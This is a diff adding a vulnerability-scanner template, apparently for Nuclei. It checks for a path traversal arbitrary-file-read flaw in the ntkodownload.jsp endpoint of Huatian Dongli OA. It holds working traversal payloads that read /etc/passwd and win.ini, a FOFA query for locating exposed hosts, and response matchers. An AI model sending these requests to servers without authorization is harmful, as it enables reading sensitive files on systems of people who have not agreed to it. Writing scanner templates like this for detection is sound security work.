@@ -1,0 +1,31 @@
+id: huatiandongli-ntkodownload-fileread
+
+info:
+  name: 华天动力 OA ntkodownload.jsp 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    华天动力协同办公 OA /OAapp/jsp/trace/ntkodownload.jsp 的 filename 参数可目录穿越读取服务器任意文件。
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="/OAapp/WebObjects/OAapp.woa"
+  tags: huatian,oa,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../etc/passwd"
+      - "{{BaseURL}}/OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../c:/windows/win.ini"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "for 16-bit app support"
+        condition: or
+      - type: status
+        status:
+          - 200
